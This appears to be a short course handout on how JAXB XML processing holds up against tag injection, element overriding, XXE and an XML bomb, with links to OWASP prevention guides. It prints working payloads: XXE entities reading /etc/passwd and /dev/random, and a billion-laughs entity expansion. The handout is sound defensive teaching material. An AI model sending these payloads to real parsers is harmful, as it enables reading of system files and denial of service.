# XML Attacks (JAXB Processing)

## Tag Injection

_Example_: Injecting new attributes and elements
```
<SessionRoot>
	<Sessions>
		<Session id="one" valid="true" hack="true"/>
		<Session id="two" valid="false" />
	</Sessions>    
	<Hack>
		<blackhack id="666" />
	</Hack>
</SessionRoot>
```

This attack doesn't work with JAXB - **new tags will be ignored**.

_Example_: Overriding existing XML elements
```
<order id="100">
    <name>FHJ-20151020-007</name>
    <lines>
        <line id="101">
            <quantity>2</quantity>
            <product id="103">
                <price>5280</price>
                <description>Design Patterns</description>
                <price>666</price> <!-- Overriding an XML element!!! -->
            </product>
            <quantity>999</quantity> <!-- Overriding an XML element!!! -->
        </line>
    </lines>
</order>
```
This **attack works** because JAXB stores the latest version of an XML element 
in the generated Java object.


## EXternal Entity Attack (XXE)

_Example_: External Entity Attack
```
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<Person>
	<FirstName>Sanjay</FirstName>
	<LastName>Acharya&xxe;</LastName>
</Person>
```
Alternative example:
```	
<!DOCTYPE foo [  
	  <!ELEMENT foo ANY >
	  <!ENTITY xxe SYSTEM "file:///dev/random" >]><foo>&xxe;</foo>
```
This **attack doesn't work** with JAXB.
```
javax.xml.bind.UnmarshalException
[org.xml.sax.SAXParseException; lineNumber: 11; columnNumber: 31; 
External Entity: Failed to read external document 'passwd', because 'file' access 
is not allowed due to restriction set by the accessExternalDTD property.]
```

## XML Bomb

_Example_: XML Bomb
```
<!DOCTYPE lolz [
  <!ENTITY lol "lol">
  <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
  <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
  <!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
  <!ENTITY lol5 "&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;">
  <!ENTITY lol6 "&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;">
  <!ENTITY lol7 "&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;">
  <!ENTITY lol8 "&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;">
  <!ENTITY lol9 "&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;">
]>
<lolz>&lol9;</lolz>	   	
```

This **attack doesn't work** with JAXB because of the maximum limit on the 
evaluation of entities.
```
javax.xml.bind.UnmarshalException
[org.xml.sax.SAXParseException; lineNumber: 1; columnNumber: 1; JAXP00010001: 
The parser has encountered more than "64000" entity expansions in this document; 
this is the limit imposed by the JDK.]
```


## Resources
* [Guide to JAXB](https://www.baeldung.com/jaxb)

* [Testing for XML Injection](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/07-Testing_for_XML_Injection)

* [XML External Entity (XXE) Processing](https://owasp.org/www-community/vulnerabilities/XML_External_Entity_(XXE)_Processing)

* [XML External Entity Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html)

* [XML External Entity (XXE) and Billion Laughs attack](https://www.geeksforgeeks.org/xml-external-entity-xxe-and-billion-laughs-attack/)

*Egon Teiniker, 2017 - 2022, GPL v3.0*